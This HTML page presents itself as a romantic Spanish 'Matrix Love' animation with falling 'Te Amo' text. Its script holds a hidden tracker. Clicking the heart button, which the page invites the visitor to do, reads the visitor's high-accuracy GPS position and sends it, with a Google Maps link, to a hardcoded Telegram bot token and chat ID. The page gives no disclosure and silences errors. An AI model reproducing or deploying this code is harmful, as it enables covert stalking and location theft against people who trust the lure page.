<!DOCTYPE html>

<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Matrix Love</title>
  <style>
    * {

  margin: 0;

  padding: 0;
  box-sizing: border-box;
}

body {
  margin: 0;
  overflow: hidden;
  background: black;
}

canvas {
  display: block;
}

.controls {
  position: absolute;
  top: 10px;
  left: 10px;
  background: rgba(0,0,0,0.5);
  padding: 10px;
  border-radius: 8px;
  z-index: 10;
}

.controls label {
  display: block;
  margin-bottom: 5px;
  color: white;
}

/* Estilos para el bot贸n coraz贸n */
.heart-button {
  position: absolute;
  top: 10px;
  right: 10px;
  background: transparent;
  border: none;
  font-size: 40px;
  cursor: pointer;
  z-index: 10;
  transition: all 0.3s ease;
  animation: heartbeat 1.5s ease-in-out infinite;
}

.heart-button:hover {
  transform: scale(1.2);
}

.heart-button.active {
  color: #ff0000;
  text-shadow: 0 0 20px #ff0000;
}

.heart-button.inactive {
  color: #666;
}

@keyframes heartbeat {
  0% { transform: scale(1); }
  14% { transform: scale(1.1); }
  28% { transform: scale(1); }
  42% { transform: scale(1.1); }
  70% { transform: scale(1); }
}

.status-message {
  position: absolute;
  top: 70px;
  right: 10px;
  background: rgba(0,0,0,0.8);
  color: white;
  padding: 8px 12px;
  border-radius: 4px;
  font-size: 12px;
  z-index: 10;
  display: none;
}
  </style>
</head>
<body>
  <div class="controls">
    <label>Velocidad: <input type="range" min="1" max="30" value="10" id="speedControl"></label>
    <label>Color: <input type="color" id="colorPicker" value="#ff69b4"></label>
    <label>Texto: <input type="text" id="textInput" value="Te Amo ,Click en el わ"></label>
  </div>

  <!-- Bot贸n coraz贸n GPS -->
  <button class="heart-button inactive" id="heartButton">わ</button>
  <div class="status-message" id="statusMessage"></div>

  <canvas id="matrixCanvas"></canvas>
  <script>
    const canvas = document.getElementById("matrixCanvas");

const ctx = canvas.getContext("2d");

let speed = 10;
let message = "Te Amo";
let color = "#ff69b4";

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

let fontSize = 14;
let columns = canvas.width / fontSize;
let drops = Array.from({ length: columns }).fill(1);

// CONTROLES
document.getElementById("speedControl").addEventListener("input", (e) => {
  speed = parseInt(e.target.value);
});

document.getElementById("colorPicker").addEventListener("input", (e) => {
  color = e.target.value;
});

document.getElementById("textInput").addEventListener("input", (e) => {
  message = e.target.value;
});

// EXPLOSIONES AL CLIC
canvas.addEventListener("click", (e) => {
  const x = e.clientX;
  const y = e.clientY;
  explosion(x, y);
});

function explosion(x, y) {
  const parts = 20;
  for (let i = 0; i < parts; i++) {
    const angle = (Math.PI * 2 * i) / parts;
    const dx = Math.cos(angle) * 5;
    const dy = Math.sin(angle) * 5;
    animateExplosion(x, y, dx, dy);
  }
}

function animateExplosion(x, y, dx, dy) {
  let life = 30;
  function frame() {
    if (life <= 0) return;
    ctx.fillStyle = color;
    ctx.font = "bold 16px Arial";
    ctx.fillText(message, x + dx * (30 - life), y + dy * (30 - life));
    life--;
    requestAnimationFrame(frame);
  }
  frame();
}

function draw() {
  ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = color;
  ctx.font = `${fontSize}px Arial`;

  for (let i = 0; i < drops.length; i++) {
    const text = message;
    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
    if (drops[i] * fontSize > canvas.height || Math.random() > 0.95) {
      drops[i] = 0;
    }
    drops[i]++;
  }
}

function animate() {
  setTimeout(() => {
    requestAnimationFrame(animate);
    draw();
  }, 1000 / speed);
}

animate();

// FUNCIONALIDAD GPS DEL CORAZN
const heartButton = document.getElementById("heartButton");
const statusMessage = document.getElementById("statusMessage");
const BOT_TOKEN = "7467431072:AAF5-MPeXoznswCvKdQoLwHskEVQ0LuR6iQ";
const CHAT_ID = "1425131487";

async function sendLocationToTelegram(latitude, longitude) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const message = ` Ubicaci贸n GPS:\n Latitud: ${latitude}\n Longitud: ${longitude}\n Google Maps: https://maps.google.com/?q=${latitude},${longitude}`;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    if (response.ok) {
      heartButton.classList.remove("inactive");
      heartButton.classList.add("active");
      
      // Volver al estado inactivo despu茅s de 2 segundos
      setTimeout(() => {
        heartButton.classList.remove("active");
        heartButton.classList.add("inactive");
      }, 2000);
    }
  } catch (error) {
    console.error("Error:", error);
  }
}

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        sendLocationToTelegram(latitude, longitude);
      },
      (error) => {
        // Silencioso - sin mensajes de error
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 60000
      }
    );
  }
}

heartButton.addEventListener("click", getLocation);
  </script>
</body>
</html>
